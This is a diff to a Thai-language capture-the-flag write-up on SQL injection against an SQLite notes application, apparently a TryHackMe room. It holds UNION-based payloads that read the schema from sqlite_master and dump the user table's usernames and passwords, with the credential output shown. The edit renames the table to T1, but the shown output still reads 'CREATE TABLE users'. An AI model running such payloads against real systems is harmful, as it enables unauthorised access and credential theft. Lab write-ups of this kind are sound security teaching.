@@ -74,9 +74,11 @@ SELECT title, note FROM notes WHERE username = '1' UNION SELECT 1, sqlite_versio
 
 ### Step 3 — ตรวจสอบโครงสร้างของ Table
 
+> ⚠️ ไม่เปิดเผยชื่อ Table จริงที่เกี่ยวข้องกับโจทย์ — ใช้ T1, T2 แทน
+
 **Payload:**
 ```sql
-1' UNION SELECT 1, (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='users')'
+1' UNION SELECT 1, (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='T1')'
 ```
 
 **ผลลัพธ์:** `CREATE TABLE users ( id integer primary key, username text unique not null, password text not null )`
@@ -87,7 +89,7 @@ SELECT title, note FROM notes WHERE username = '1' UNION SELECT 1, sqlite_versio
 
 **Payload:**
 ```sql
-1' UNION SELECT 1, (SELECT group_concat(id || "," || username || "," || password || ":") FROM users)'
+1' UNION SELECT 1, (SELECT group_concat(id || "," || username || "," || password || ":") FROM T1)'
 ```
 
 **ผลลัพธ์:**
@@ -98,7 +100,6 @@ SELECT title, note FROM notes WHERE username = '1' UNION SELECT 1, sqlite_versio
 4,maja,345m3io4hj3:
 5,xxxFLAGxxx,THM{...}:
 6,emil,viking123:
-7–10 คือ payload ที่เราสร้างระหว่าง enumerate
 ```
 
 ---
